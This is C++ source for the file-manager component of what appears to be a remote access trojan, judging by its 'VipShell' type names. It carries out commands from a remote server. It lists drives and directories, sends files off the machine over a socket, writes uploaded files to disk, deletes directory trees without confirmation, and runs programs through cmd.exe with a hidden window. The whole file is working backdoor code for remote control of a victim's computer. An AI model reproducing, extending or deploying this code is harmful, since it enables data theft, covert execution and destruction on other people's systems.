#include ".\filemanageproc.h"







CFileManage::CFileManage(void)
{
	GetRoot();
}

CFileManage::~CFileManage(void)
{
}
void CFileManage::GetRoot()
{
	m_info.clear();
	TCHAR driver[10];
	for (UINT i = 0 ; i < 26; i++)
	{
		structFileInfo driverInfo;
		driver[0] = i + _T('A');
		driver[1] = _T(':');
		driver[2] = _T('\\');
		driver[3] = 0;
		DWORD drivertype = GetDriveType(driver);
		if(drivertype == DRIVE_NO_ROOT_DIR)
			continue;
		lstrcpy(driverInfo.szName, driver);
		driverInfo.dwType = drivertype;
		driverInfo.ullcanusebyte = 0;
		driverInfo.ulltotalspace = 0;
		driverInfo.ullfreespace = 0;
		if(driver[0] == _T('A') || driver[0] == _T('A'))
		{
			m_info.push_back(driverInfo);
			continue;
		}
	//	if(drivertype != DRIVE_FIXED)
	//	{
	//		m_info.push_back(driverInfo);
	//		continue;
	//	}
		GetDiskFreeSpaceEx (driver, (PULARGE_INTEGER)&driverInfo.ullcanusebyte, (PULARGE_INTEGER)&driverInfo.ulltotalspace, (PULARGE_INTEGER)&driverInfo.ullfreespace);
		driverInfo.ullcanusebyte = driverInfo.ulltotalspace - driverInfo.ullfreespace;
		m_info.push_back(driverInfo);
	}

}

bool CFileManage::GetFileInfo(LPCTSTR szPath)
{
	m_Fileinfo.clear();
	tagVipShellFileInfo tagFileInfo;
	WCHAR szFilePath[MAX_PATH] = {0};
	lstrcpy(szFilePath, szPath);
	if(szFilePath[lstrlen(szFilePath) - 1] != _T('\\'))
		_tcscat(szFilePath, _T("\\"));
	lstrcat(szFilePath, _T("*.*"));
	WIN32_FIND_DATA fileinfo;
	HANDLE hFile = FindFirstFile( szFilePath, &fileinfo );
	if(hFile == INVALID_HANDLE_VALUE )
		return false;
	do 
	{
		lstrcpy(tagFileInfo.cFileName, fileinfo.cFileName);
		tagFileInfo.dwFileSize = (fileinfo.nFileSizeHigh * (0xffffffff)) + fileinfo.nFileSizeLow;
		tagFileInfo.ftLastWriteTime = fileinfo.ftLastWriteTime;
		tagFileInfo.bIsDir = IsDir(fileinfo);
		m_Fileinfo.push_back(tagFileInfo);
	} while(FindNextFile(hFile, &fileinfo));
	FindClose(hFile);
	return true;
}


bool CFileManage::IsDir(WIN32_FIND_DATA& file)
{
	if(file.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		return true;
	return false;
}


////////////////////////////////////////////////////////////////////////////////





CFileManageProc::CFileManageProc(void)
{
	m_pSendBuf = NULL;
	m_dwBufLen = 0;
}


CFileManageProc::~CFileManageProc(void)
{
	if(m_pSendBuf)
		delete m_pSendBuf;
}

BYTE* CFileManageProc::__NewBuff(DWORD dwLen)
{
	if(m_dwBufLen >= dwLen)
		return m_pSendBuf;
	if(m_pSendBuf)
		delete m_pSendBuf;
	m_pSendBuf = new BYTE[dwLen];
	if (m_pSendBuf == NULL)
		m_dwBufLen = 0;
	return m_pSendBuf;
}


DWORD CFileManageProc::__GetFileSize(LPCTSTR szFile)
{
	DWORD dwSize;
	HANDLE hFile = CreateFile(szFile, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	if(hFile == INVALID_HANDLE_VALUE)
		return -1;
	dwSize = GetFileSize (hFile, NULL) ; 
	if (dwSize == INVALID_FILE_SIZE) 
	{
		CloseHandle(hFile);
		return -1;
	}
	CloseHandle(hFile);
	return dwSize;
}
bool CFileManageProc::__SendFile(LPCTSTR szFile)
{
	HANDLE hFile = CreateFile(szFile, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	if(hFile == INVALID_HANDLE_VALUE)
		return false;
	DWORD dwRead = 0;
	BYTE Buf[16 * 1024];
	bool bRet = false;
	while(true)
	{
		ReadFile(hFile, Buf, 16 * 1024, &dwRead, 0);
		if(dwRead == 0)
		{
			bRet = TRUE;
			break;
		}
		
		if( _SendBuffData(Buf, dwRead) == SOCKET_ERROR)
			break;
	}
	CloseHandle(hFile);
	return bRet;
}
bool CFileManageProc::__RecvFile(LPCTSTR szFile, DWORD dwSize)
{
	FILE* fp = _wfopen(szFile, L"wb");
	if(fp == NULL)
		return false;
	if( dwSize == 0)
	{
		fclose(fp);
		return true;
	}
	DWORD dwlen = dwSize;
	DWORD dwSendBuflen = 16 * 1024;
	BYTE Buf[16 * 1024];
	DWORD dwSendLen = 0;
	DWORD dwSended;
	DWORD dwRbuf = dwlen;
	bool bIsOk = false;
	while(dwSendLen < dwlen)
	{
		dwRbuf = (dwlen - dwSendLen);
		if( dwRbuf >=  dwSendBuflen)
		{
			dwSended = m_hServer->Recv(Buf, dwSendBuflen);
			if( dwSended == SOCKET_ERROR)
		    	break;
		}
		else
		{
			dwSended = m_hServer->Recv(Buf, dwRbuf);
			if( dwSended == SOCKET_ERROR)
		    	break;
		}
		fwrite(Buf, 1, dwSended, fp);
		dwSendLen += dwSended;
	}
	if(dwSendLen == dwlen)
		bIsOk =true;
	fclose(fp);
	return bIsOk;
}
BOOL CFileManageProc::DelTree(LPCTSTR lpszPath)
{
	SHFILEOPSTRUCT FileOp;
	FileOp.fFlags = FOF_NOCONFIRMATION;
	FileOp.hNameMappings = NULL;
	FileOp.hwnd = NULL;
	FileOp.lpszProgressTitle = NULL;
	FileOp.pFrom = lpszPath;
	FileOp.pTo = NULL;
	FileOp.wFunc = FO_DELETE;
	return SHFileOperation(&FileOp) == 0;
}

void CFileManageProc::OnCmd_GetDoWork(tagVipShellCmd* info)
{
	tagVipShellCmd SendInfo;
	SendInfo.dwCmd = 4; 
	m_hServer->Send(&SendInfo, sizeof(tagVipShellCmd));
}

void CFileManageProc::OnFileManageGetRoot(tagVipShellCmd* info)
{
	m_hFileManage.GetRoot();
	DWORD dwVerSize = (DWORD)m_hFileManage.m_info.size();
	tagVipShellCmd SendInfo;
	SendInfo.dwCmd = CMD_ISOK;
	SendInfo.dw1 = dwVerSize;
	int nRet = m_hServer->Send(&SendInfo, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
	{
		m_hServer->Close();
		return ;
	}
	nRet = m_hServer->Recv(&SendInfo, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
	{
		m_hServer->Close();
		return ;
	}
	BYTE* pBuf = __NewBuff(sizeof(structFileInfo) * dwVerSize);
	for(DWORD i = 0; i < dwVerSize; i++)
		memcpy(pBuf + sizeof(structFileInfo) * i, &m_hFileManage.m_info[i], sizeof(structFileInfo));
	nRet = _SendBuffData(pBuf, sizeof(structFileInfo) * dwVerSize);
	if(nRet == SOCKET_ERROR)
	{
		m_hServer->Close();
		return ;
	}
}
void CFileManageProc::OnFileManageGetFilePath(tagVipShellCmd* info)
{
	m_hFileManage.GetFileInfo((WCHAR*)info->pBuff);
	DWORD dwVerSize = (DWORD)m_hFileManage.m_Fileinfo.size();
	tagVipShellCmd SendInfo;
	SendInfo.dwCmd = CMD_ISOK;
	SendInfo.dw1 = dwVerSize;
	int nRet = m_hServer->Send(&SendInfo, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
	{
		m_hServer->Close();
		return ;
	}
	if(dwVerSize == 0)
		return ;
	nRet = m_hServer->Recv(&SendInfo, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
	{
		m_hServer->Close();
		return ;
	}
	BYTE* pBuf = __NewBuff(sizeof(tagVipShellFileInfo) * dwVerSize);
	for(DWORD i = 0; i < dwVerSize; i++)
		memcpy(pBuf + sizeof(tagVipShellFileInfo) * i, &m_hFileManage.m_Fileinfo[i], sizeof(tagVipShellFileInfo));
	nRet = _SendBuffData(pBuf, sizeof(tagVipShellFileInfo) * dwVerSize);
	if(nRet == SOCKET_ERROR)
	{
		m_hServer->Close();
		return ;
	}
}

void CFileManageProc::OnFileManageDelFile(tagVipShellCmd* info)
{
	BOOL bIsOk = DelTree((LPCTSTR)info->pBuff);
	tagVipShellCmd SendInfo;
	if(bIsOk)
		SendInfo.dwCmd = CMD_ISOK; 
	else
		SendInfo.dwCmd = CMD_ERROR; 
	m_hServer->Send(&SendInfo, sizeof(tagVipShellCmd));
}

void CFileManageProc::OnFileManageRunFile(tagVipShellCmd* info)
{
	DWORD dwRun;
	char szPath[MAX_PATH];
	char szPathDir[MAX_PATH] = {0};
	ZeroMemory(szPath, sizeof(szPath));
	memcpy(szPath, info->pBuff, 255);
	memcpy(szPathDir, info->pBuff + 256, 255);
	dwRun = info->dw1;

	char szCmd[512] = {0};
	sprintf(szCmd, "cmd.exe /c \"%s\"", szPath);
	PROCESS_INFORMATION ProcessInfo; 
	STARTUPINFOA StartupInfo; //This is an [in] parameter
	ZeroMemory(&StartupInfo, sizeof(StartupInfo));
	StartupInfo.cb = sizeof StartupInfo ; //Only compulsory field
	StartupInfo.lpDesktop="WinSta0\\Default";
	StartupInfo.dwFlags = STARTF_USESHOWWINDOW; 

	StartupInfo.wShowWindow = SW_HIDE;
	if(dwRun != SW_HIDE)
	{
		if(CreateProcessA(NULL, szCmd, 
			NULL,NULL,FALSE,0,NULL,
			szPathDir,&StartupInfo,&ProcessInfo))
		{ 
			CloseHandle(ProcessInfo.hThread);
			CloseHandle(ProcessInfo.hProcess);
		}
	}
	else
		ShellExecuteA(GetDesktopWindow(), "open", szPath, NULL, szPathDir, dwRun);
	tagVipShellCmd SendInfo;
	SendInfo.dwCmd = CMD_ISOK ;
	m_hServer->Send(&SendInfo, sizeof(tagVipShellCmd));
}

void CFileManageProc::OnFileManageMoveFile(tagVipShellCmd* info)
{
	DWORD dwRun;
	char szPath[MAX_PATH];
	char szPathDir[MAX_PATH] = {0};
	ZeroMemory(szPath, sizeof(szPath));
	memcpy(szPath, info->pBuff, 255);
	memcpy(szPathDir, info->pBuff + 256, 255);
	dwRun = info->dw1;
	BOOL bIsOK = ::MoveFileA(szPath, szPathDir);
	tagVipShellCmd SendInfo;
	if(bIsOK)
		SendInfo.dwCmd = CMD_ISOK; 
	else
		SendInfo.dwCmd = CMD_ERROR;
	m_hServer->Send(&SendInfo, sizeof(tagVipShellCmd));
}

void CFileManageProc::OnFileManageDownFile(tagVipShellCmd* info)
{
	tagVipShellCmd SendInfo;
	DWORD dwFileSize = __GetFileSize((LPCTSTR)info->pBuff);
	SendInfo.dwCmd = CMD_ISOK;
	SendInfo.dw1 = dwFileSize;
	int nRet = m_hServer->Send(&SendInfo, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
	{
		m_hServer->Close();
		return ;
	}
	if(dwFileSize == -1)
		return ;
	nRet = m_hServer->Recv(&SendInfo, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
	{
		m_hServer->Close();
		return ;
	}
	bool bRet  = __SendFile((LPCTSTR)info->pBuff);
	if(!bRet)
		m_hServer->Close();
	return ;
}



void CFileManageProc::OnFileManageUpFile(tagVipShellCmd* info)
{
	tagVipShellCmd SendInfo;
	SendInfo.dwCmd = CMD_ISOK;
	int nRet = m_hServer->Send(&SendInfo, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
	{
		m_hServer->Close();
		return ;
	}
	bool bRet = __RecvFile((LPCTSTR)info->pBuff, info->dw1);
	if(!bRet)
	{
		m_hServer->Close();
		return ;
	}
	if(info->dw1 == 0 )
		return ;
	nRet = m_hServer->Send(&SendInfo, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
	{
		m_hServer->Close();
		return ;
	}
}

void CFileManageProc::OnFileManageCreateDir(tagVipShellCmd* info)
{
	BOOL bIsOk = CreateDirectory((LPCTSTR)info->pBuff, NULL);
	tagVipShellCmd SendInfo;
	if(bIsOk)
		SendInfo.dwCmd = CMD_ISOK; 
	else
		SendInfo.dwCmd = CMD_ERROR; 
	m_hServer->Send(&SendInfo, sizeof(tagVipShellCmd));
}
